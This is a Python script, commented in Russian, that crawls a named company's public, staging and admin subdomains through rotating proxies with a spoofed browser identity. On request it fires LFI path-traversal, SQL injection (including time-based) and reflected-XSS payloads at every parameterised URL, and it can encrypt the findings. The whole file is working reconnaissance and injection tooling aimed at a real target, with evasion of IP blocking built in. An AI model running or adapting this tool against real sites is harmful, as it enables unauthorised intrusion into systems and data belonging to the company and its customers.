#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Многопоточный паук-краулер для ABET Global через пул SOCKS/HTTP прокси с ротацией.
Разведка: GET-запросы, сбор URL/JS/форм/robots + LFI-проверка параметров (полуактивная).
Флаги: --lfi (LFI-тест), --kirpich (age-шифрование результатов, ключ проекта).
Без эксплуатации: только чтение и полуактивные GET-запросы через прокси."""
import re
import sys
import os
import time
import json
import urllib3
import requests
import subprocess
import concurrent.futures as cf

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FLAG_LFI = "--lfi" in sys.argv
FLAG_SQLI = "--sqli" in sys.argv
FLAG_XSS = "--xss" in sys.argv
FLAG_KIRPICH = "--kirpich" in sys.argv

LFI_NAMES = ("file", "path", "page", "template", "doc", "include", "lang", "dir", "folder", "style", "theme", "load", "read", "url", "filename", "filepath")
LFI_PAYLOADS = (
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..\\..\\..\\..\\..\\windows\\win.ini",
    "../../../../../../windows/win.ini",
    "....//....//....//etc/passwd",
)
LFI_INDICATORS = ("root:", "daemon:", "win.ini", "[fonts]", "[extensions]", "boot.ini", "nobody:", "syntax error", "failed to open stream")

SQLI_NAMES = ("id", "user", "uid", "page", "cat", "category", "product", "item", "news", "article", "post", "search", "q", "query", "lang", "file", "doc", "download", "ref", "order", "sort")
SQLI_PAYLOADS = (
    "'",
    "''",
    "' OR '1'='1",
    "' OR 1=1--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1 AND SLEEP(5)",
    "\" OR \"1\"=\"1",
    "1 OR 1=1",
)
SQLI_INDICATORS = (
    "sql syntax", "mysql", "mariadb", "postgresql", "oracle", "sqlite", "microsoft odbc",
    "unclosed quotation", "unterminated string", "mysql_fetch", "you have an error",
    "warning: mysql", "pg_query", "syntax error", "db error", "database error",
    "sqlstate", "odbc driver", "server error in", "exception", "stack trace",
    "query failed", "invalid query", "psql", "mssql", "sql server",
)
SQLI_TIME_MS = 4500  # порог для time-based детекции

XSS_NAMES = ("q", "search", "query", "s", "term", "name", "user", "username", "email", "comment", "msg", "message", "text", "title", "lang", "page", "url", "link", "id", "ref")
XSS_PAYLOADS = (
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '"><iframe src="javascript:alert(1)">',
    'javascript:alert(1)',
    '"><svg onload=alert(document.domain)>',
)
XSS_REFLECT = ("<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "<iframe src=\"javascript:alert(1)\">", "<svg onload=alert(document.domain)>")

def _parse_hosts():
    """Хосты — из аргументов без '--' (флаги отфильтровываем)."""
    hosts = [a for a in sys.argv[1:] if not a.startswith("--") and "," in a]
    if hosts:
        return hosts[0].split(",")
    # один хост без запятой тоже допустим
    single = [a for a in sys.argv[1:] if not a.startswith("--") and "." in a]
    if single:
        return [single[0]]
    return [
        "abetglobal.com", "www.abetglobal.com", "uat.abetglobal.com",
        "testadmin.abetglobal.com", "eedmin.abetglobal.com", "manage.abetglobal.com",
        "secure.abetglobal.com", "www.secure.abetglobal.com", "staging.abetglobal.com",
        "forum.abetglobal.com", "api.abetglobal.com", "cmsapi.abetglobal.com",
        "crypto.abetglobal.com", "testmt5.abetglobal.com", "applicationapi.abetglobal.com",
    ]

HOSTS = _parse_hosts()

PROXIES = [
    {"http": "socks5h://127.0.0.1:1080", "https": "socks5h://127.0.0.1:1080"},
    {"http": "http://127.0.0.1:8081", "https": "http://127.0.0.1:8081"},
]

def _fresh_proxies():
    """Свежие SOCKS5 из пула (ротатор уже перебирает мёртвых), до 8 штук."""
    try:
        with open("/root/office/container/pool/output/socks5_pool.json") as f:
            data = json.load(f)
        out = []
        for p in data.get("proxies", []):
            if p.get("alive") and p.get("proto") == "socks5" and ":" in p.get("proxy", ""):
                out.append({"http": "socks5h://" + p["proxy"], "https": "socks5h://" + p["proxy"]})
            if len(out) >= 8:
                break
        return out
    except Exception:
        return []

def _refresh_proxies():
    global PROXIES
    fresh = _fresh_proxies()
    if fresh:
        base = [
            {"http": "socks5h://127.0.0.1:1080", "https": "socks5h://127.0.0.1:1080"},
            {"http": "http://127.0.0.1:8081", "https": "http://127.0.0.1:8081"},
        ]
        PROXIES = base + fresh
        print(f"[spider] пул прокси обновлён: {len(PROXIES)} (ротатор + {len(fresh)} свежих)", flush=True)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
MAX_WORKERS = 16
DEPTH = 2
MAX_URLS_PER_HOST = 120
TIMEOUT = 12
_pi = 0
_lock = __import__("threading").Lock()
PROXY_STATE = {}  # id(proxy) -> {"fail": n}

def check_proxies():
    """Health-check всех прокси при старте: параллельный пинг через api.ipify.org.
    Возвращает список живых прокси и печатает статус-таблицу."""
    def ping(p):
        try:
            r = requests.get("https://api.ipify.org", proxies=p, verify=False, timeout=8)
            return (p, r.status_code == 200, r.text.strip())
        except Exception:
            return (p, False, "-")
    alive = []
    with cf.ThreadPoolExecutor(max_workers=len(PROXIES)) as ex:
        results = list(ex.map(ping, PROXIES))
    print("[spider] ── HEALTH-CHECK прокси ──", flush=True)
    for p, ok, ip in results:
        tag = p.get("http", "")
        status = f"OK (exit={ip})" if ok else "DEAD"
        print(f"  {tag:45} {status}", flush=True)
        if ok:
            alive.append(p)
    if not alive:
        print("[spider] ВСЕ прокси мертвы — работаю с последним известным", flush=True)
        alive = PROXIES[:1]
    return alive

def next_proxy():
    global _pi
    with _lock:
        for _ in range(len(PROXIES)):
            p = PROXIES[_pi % len(PROXIES)]
            _pi += 1
            st = PROXY_STATE.get(id(p), {"fail": 0})
            if st["fail"] < 3:  # живой или мало ошибок
                return p
        return PROXIES[0]

def proxy_fail(p):
    with _lock:
        st = PROXY_STATE.setdefault(id(p), {"fail": 0})
        st["fail"] += 1

def proxy_ok(p):
    with _lock:
        st = PROXY_STATE.setdefault(id(p), {"fail": 0})
        st["fail"] = 0

RE_LINKS = re.compile(r'(?:href|src|action|data-url|data-href)=["\']([^"\']+)["\']', re.I)
RE_JS = re.compile(r'\.js(?:\?[^"\'\s)]*)?', re.I)

def norm(base, u):
    if not u or u.startswith(('#', 'javascript:', 'mailto:', 'tel:', 'data:')):
        return None
    if u.startswith('//'):
        u = 'https:' + u
    u = requests.compat.urljoin(base, u)
    if u.startswith('http') and not u.startswith('https'):
        u = 'https' + u[4:]
    return u

def is_same_host(u, host):
    try:
        from urllib.parse import urlparse
        return urlparse(u).netloc == host or urlparse(u).netloc.endswith('.' + host)
    except Exception:
        return False

def fetch(url, host):
    """GET с ротацией прокси и failover (до 3 прокси на запрос). Возвращает (status, content_type, body) или (0, None, None)."""
    for _try in range(3):
        proxy = next_proxy()
        try:
            r = requests.get(url, proxies=proxy, headers={"User-Agent": UA,
                "Accept": "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Referer": "https://www.google.com/",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "cross-site",
                "Cache-Control": "no-cache"}, verify=False, timeout=TIMEOUT,
                allow_redirects=True)
            proxy_ok(proxy)
            if r.status_code and r.status_code < 400:
                return (r.status_code, (r.headers.get('Content-Type') or '').lower(), r.text)
            # 4xx/5xx — пробуем следующий прокси (сайт может блочить этот IP)
            proxy_fail(proxy)
            continue
        except Exception:
            proxy_fail(proxy)
            continue
    return (0, None, None)

def crawl_host(host):
    base = f"https://{host}/"
    seen, to_visit = set(), [base]
    found = {"urls": set(), "js": set(), "forms": [], "robots": [], "sitemap": [], "errors": []}
    depth_map = {base: 0}
    for _ in range(MAX_URLS_PER_HOST):
        if not to_visit:
            break
        url = to_visit.pop(0)
        if url in seen:
            continue
        seen.add(url)
        d = depth_map.get(url, 0)
        st, ct, body = fetch(url, host)
        found["urls"].add(f"{st}\t{url}")
        if st == 0:
            found["errors"].append(url)
            continue
        if not body:
            continue
        # robots.txt / sitemap
        if url.rstrip('/').endswith('/robots.txt'):
            for line in body.splitlines():
                if line.strip().startswith(('Disallow', 'Allow')):
                    found["robots"].append(line.strip())
                    p = line.split(':', 1)[1].strip() if ':' in line else None
                    if p and p != '/':
                        pu = norm(base, p)
                        if pu and is_same_host(pu, host) and pu not in seen:
                            to_visit.append(pu); depth_map[pu] = d + 1
        if 'sitemap' in url:
            for m in re.findall(r'<loc>\s*([^<]+?)\s*</loc>', body, re.I):
                found["sitemap"].append(m)
        # формы
        for fm in re.findall(r'<form[^>]*>(.*?)</form>', body, re.I | re.S):
            action = re.search(r'action=["\']([^"\']*)', fm, re.I)
            method = re.search(r'method=["\']([^"\']*)', fm, re.I)
            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', fm, re.I) + \
                     re.findall(r'<select[^>]*name=["\']([^"\']+)["\']', fm, re.I)
            found["forms"].append({"page": url, "action": action.group(1) if action else "",
                                   "method": (method.group(1) if method else "get").upper(),
                                   "inputs": list(dict.fromkeys(inputs))})
        # ссылки
        for m in RE_LINKS.findall(body):
            u = norm(url, m)
            if not u or not is_same_host(u, host):
                continue
            if RE_JS.search(u) and u.lower().endswith('.js'):
                found["js"].add(u)
                continue
            if u not in seen and u not in to_visit and d < DEPTH:
                to_visit.append(u); depth_map[u] = d + 1
    return host, found

def lfi_check(host, url):
    """Полуактивная LFI-проверка: для параметров-кандидатов подставляет traversal payload.
    Возвращает список находок [(param, payload, code, indicator)]."""
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    hits = []
    if "?" not in url:
        return hits
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    for name, val in params:
        if name.lower() not in LFI_NAMES:
            continue
        for payload in LFI_PAYLOADS:
            new_q = urlencode([(n, payload if n == name else v) for n, v in params])
            target = urlunparse(parsed._replace(query=new_q))
            st, ct, body = fetch(target, host)
            if st == 200 and body:
                low = body.lower()
                for ind in LFI_INDICATORS:
                    if ind in low:
                        hits.append((name, payload, st, ind))
                        break
    return hits


def sqli_check(host, url):
    """Полуактивная SQLi-проверка: параметры-кандидаты + payload, ищем индикаторы ошибок БД и time-based.
    Только GET-запросы через прокси, без эксплуатации/дампов."""
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    hits = []
    if "?" not in url:
        return hits
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return hits
    for name, val in params:
        if name.lower() not in SQLI_NAMES:
            continue
        for payload in SQLI_PAYLOADS:
            new_q = urlencode([(n, payload if n == name else v) for n, v in params])
            target = urlunparse(parsed._replace(query=new_q))
            t0 = time.time()
            st, ct, body = fetch(target, host)
            dt = (time.time() - t0) * 1000
            # time-based (SLEEP/WAITFOR)
            if dt > SQLI_TIME_MS and ("sleep" in payload.lower() or "waitfor" in payload.lower()):
                hits.append((name, payload, st, f"TIME-BASED {int(dt)}ms"))
                continue
            if st == 200 and body:
                low = body.lower()
                for ind in SQLI_INDICATORS:
                    if ind in low:
                        hits.append((name, payload, st, ind))
                        break
    return hits


def xss_check(host, url):
    """Полуактивная XSS-проверка: параметры-кандидаты + payload, проверка ОТРАЖЕНИЯ в ответе.
    Только GET-запросы через прокси, без эксплуатации."""
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    hits = []
    if "?" not in url:
        return hits
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    if not params:
        return hits
    for name, val in params:
        if name.lower() not in XSS_NAMES:
            continue
        for payload in XSS_PAYLOADS:
            new_q = urlencode([(n, payload if n == name else v) for n, v in params])
            target = urlunparse(parsed._replace(query=new_q))
            st, ct, body = fetch(target, host)
            if st == 200 and body:
                for ind in XSS_REFLECT:
                    if ind in body:
                        # отражение без экранирования = рефлектед XSS
                        hits.append((name, payload, st, f"REFLECTED: {ind[:40]}"))
                        break
    return hits
    """Полуактивная LFI-проверка: для параметров-кандидатов подставляет traversal payload.
    Возвращает список находок [(param, payload, code, indicator)]."""
    from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
    hits = []
    if "?" not in url:
        return hits
    parsed = urlparse(url)
    params = parse_qsl(parsed.query, keep_blank_values=True)
    for name, val in params:
        if name.lower() not in LFI_NAMES:
            continue
        for payload in LFI_PAYLOADS:
            new_q = urlencode([(n, payload if n == name else v) for n, v in params])
            target = urlunparse(parsed._replace(query=new_q))
            st, ct, body = fetch(target, host)
            if st == 200 and body:
                low = body.lower()
                for ind in LFI_INDICATORS:
                    if ind in low:
                        hits.append((name, payload, st, ind))
                        break
    return hits

def main():
    target_name = HOSTS[0].replace(".com", "").replace(".pl", "").replace(".net", "").replace(".io", "").replace(".", "_")
    out_urls = f"/root/office/output/{target_name}_spider_urls.txt"
    out_js = f"/root/office/output/{target_name}_spider_js.txt"
    out_forms = f"/root/office/output/{target_name}_spider_forms.txt"
    lfi_out = f"/root/office/output/{target_name}_lfi.txt"
    _refresh_proxies()
    global PROXIES
    PROXIES = check_proxies()  # health-check при старте: в ротации только живые
    all_urls, all_js, all_forms = set(), set(), []
    robots_all, sitemap_all, errs = {}, {}, {}
    with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futs = {ex.submit(crawl_host, h): h for h in HOSTS}
        for fu in cf.as_completed(futs):
            h = futs[fu]
            try:
                host, found = fu.result()
                all_urls.update(found["urls"])
                all_js.update(found["js"])
                all_forms.extend(found["forms"])
                robots_all[host] = found["robots"]
                sitemap_all[host] = found["sitemap"]
                errs[host] = found["errors"]
                print(f"[DONE] {host}: urls={len(found['urls'])} js={len(found['js'])} forms={len(found['forms'])} err={len(found['errors'])}", flush=True)
            except Exception as e:
                print(f"[FAIL] {h}: {e}", flush=True)
    with open(out_urls, "w") as f:
        f.write("\n".join(sorted(all_urls)) + "\n")
    with open(out_js, "w") as f:
        f.write("\n".join(sorted(all_js)) + "\n")
    with open(out_forms, "w") as f:
        for fm in all_forms:
            f.write(f"{fm['method']} {fm['page']} -> action={fm['action']} inputs={fm['inputs']}\n")
    # LFI-проход по всем собранным URL с параметрами
    lfi_hits = []
    cands = []
    # ⚠️ Инъекции проводятся ТОЛЬКО по точкам входа: URL с параметрами (?) или формами.
    # Если у хоста нет URL с параметрами — инъекции не запускаются (нет поверхности).
    param_urls = [u.split("\t", 1)[1] for u in all_urls if "?" in u]
    # Отсекаем cache-busting (?v=, ?ver=, ?_=, ?version=) — это НЕ точки входа
    from urllib.parse import urlparse, parse_qsl
    _real = []
    for u in param_urls:
        try:
            q = dict(parse_qsl(urlparse(u).query))
        except Exception:
            q = {}
        if q and not all(k.lower() in ("v", "ver", "version", "_", "t", "ts", "timestamp") for k in q):
            _real.append(u)
    param_urls = list(dict.fromkeys(_real))
    if FLAG_LFI and param_urls:
        print(f"\n=== LFI-ПРОВЕРКА (только URL с параметрами: {len(param_urls)}) ===", flush=True)
        cands = param_urls[:80]
        with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futs = {ex.submit(lfi_check, "spider", u): u for u in cands}
            for fu in cf.as_completed(futs):
                u = futs[fu]
                try:
                    for h in fu.result():
                        lfi_hits.append((u, *h))
                        print(f"[LFI-HIT] {u} | param={h[0]} payload={h[1]} code={h[2]} ind={h[3]}", flush=True)
                except Exception:
                    pass
    elif FLAG_LFI:
        print("\n=== LFI: пропущено — URL с параметрами не найдены ===", flush=True)
    with open(lfi_out, "w") as f:
        f.write(f"# LFI-проверка паука, {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}, кандидатов={len(cands) if FLAG_LFI else 0}\n")
        for hit in lfi_hits:
            f.write(f"{hit[0]} | param={hit[1]} payload={hit[2]} code={hit[3]} ind={hit[4]}\n")
    # SQLi-проход: только по URL с параметрами (точки входа)
    sqli_hits = []
    sqli_cands = []
    if FLAG_SQLI and param_urls:
        print(f"\n=== SQLi-ПРОВЕРКА (только URL с параметрами: {len(param_urls)}) ===", flush=True)
        sqli_cands = param_urls[:80]
        with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futs = {ex.submit(sqli_check, "spider", u): u for u in sqli_cands}
            for fu in cf.as_completed(futs):
                u = futs[fu]
                try:
                    for h in fu.result():
                        sqli_hits.append((u, *h))
                        print(f"[SQLI-HIT] {u} | param={h[0]} payload={h[1]} code={h[2]} ind={h[3]}", flush=True)
                except Exception:
                    pass
    elif FLAG_SQLI:
        print("\n=== SQLi: пропущено — URL с параметрами не найдены ===", flush=True)
    sqli_out = f"/root/office/output/{target_name}_sqli.txt"
    with open(sqli_out, "w") as f:
        f.write(f"# SQLi-проверка паука, {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}, кандидатов={len(sqli_cands) if FLAG_SQLI else 0}\n")
        for hit in sqli_hits:
            f.write(f"{hit[0]} | param={hit[1]} payload={hit[2]} code={hit[3]} ind={hit[4]}\n")
    # XSS-проход: только по URL с параметрами (точки входа)
    xss_hits = []
    xss_cands = []
    if FLAG_XSS and param_urls:
        print(f"\n=== XSS-ПРОВЕРКА (только URL с параметрами: {len(param_urls)}) ===", flush=True)
        xss_cands = param_urls[:80]
        with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
            futs = {ex.submit(xss_check, "spider", u): u for u in xss_cands}
            for fu in cf.as_completed(futs):
                u = futs[fu]
                try:
                    for h in fu.result():
                        xss_hits.append((u, *h))
                        print(f"[XSS-HIT] {u} | param={h[0]} payload={h[1]} code={h[2]} ind={h[3]}", flush=True)
                except Exception:
                    pass
    elif FLAG_XSS:
        print("\n=== XSS: пропущено — URL с параметрами не найдены ===", flush=True)
    xss_out = f"/root/office/output/{target_name}_xss.txt"
    with open(xss_out, "w") as f:
        f.write(f"# XSS-проверка паука, {time.strftime('%Y-%m-%d %H:%M')}, хостов={len(HOSTS)}, кандидатов={len(xss_cands) if FLAG_XSS else 0}\n")
        for hit in xss_hits:
            f.write(f"{hit[0]} | param={hit[1]} payload={hit[2]} code={hit[3]} ind={hit[4]}\n")
    # Кирпич: шифрование результатов age-ключом проекта
    if FLAG_KIRPICH:
        for f_ in (out_urls, out_js, out_forms, lfi_out, sqli_out, xss_out):
            if os.path.exists(f_):
                try:
                    subprocess.run(["kirpich-encrypt.sh", f_], check=True, capture_output=True)
                    print(f"[KIRPICH] зашифровано: {f_}.age", flush=True)
                except Exception as e:
                    print(f"[KIRPICH] не удалось ({f_}): {e}", flush=True)
    print("\n=== ИТОГО ===")
    print(f"URL: {len(all_urls)} | JS: {len(all_js)} | FORM: {len(all_forms)} | LFI-HITS: {len(lfi_hits)} | SQLI-HITS: {len(sqli_hits)} | XSS-HITS: {len(xss_hits)}")
    print("\n--- ROBOTS ---")
    for h, r in robots_all.items():
        if r:
            print(h, "->", "; ".join(r))
    print("\n--- SITEMAP (loc) ---")
    for h, s in sitemap_all.items():
        if s:
            print(h, "->", "; ".join(s[:30]))
    print("\n--- ERRORS (недоступно) ---")
    for h, e in errs.items():
        if e:
            print(h, "->", len(e))

if __name__ == "__main__":
    main()
